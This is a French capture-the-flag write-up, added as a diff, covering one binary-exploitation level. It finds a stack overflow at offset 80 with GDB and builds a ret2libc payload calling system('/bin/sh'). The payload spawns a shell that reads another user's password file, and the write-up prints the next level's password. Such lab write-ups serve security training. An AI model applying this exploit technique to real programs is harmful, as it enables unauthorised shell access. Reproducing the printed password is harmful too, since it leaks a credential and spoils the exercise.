@@ -1,0 +1,45 @@
+On analyse notre programme via GDB. (cf ./Ressources/asm)
+On voit que le programme demande un user_name et un mot de passe.
+Pour passer au mot de passe il faut que le nom d'utilisateur soit égale à "dat_wil"
+Quand à la fonction verify_user_pass, le mot de passe doit être égale à admin.
+Le problème c'est que si on entre le user admin et le bon mot de passe, le programme ne fait tout simplement rien,
+il va quitter sans rien faire que ce soit avec ou sans le bon mot de passe.
+On va donc devoir exploiter le programme autrement. Pour cela on a deux fgets qui peuvent nous aider.
+Tentons de faire overflow :
+
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level01/level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password: 
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x55555555 in ?? ()
+
+0x55555555 ---> UUUU ----> 80e position.
+On a bien un overflow à la 80 e position, et il overflow l'EIP, cela signifie qu'on va surement pouvoir faire un return to libc.
+Pour cela on a besoin de l'addresse d'une fonction system, de l'addresse d'une fonction exit, et de l'addresse de la mention "/bin/sh" :
+
+(gdb) b main
+(gdb) run
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) find 0xf7e2c000, 0xf7ffe000, "/bin/sh"
+0xf7f897ec
+
+On a plus qu'à faire notre retToLibc en plaçant l'appelle à system("/bin/sh") à l'endroit de notre overflow ! :
+
+$ python -c 'print "dat_wil" + "\n" + 80 * "A" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]' > /tmp/level01
+$ cat /tmp/level01 - | ./level01
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
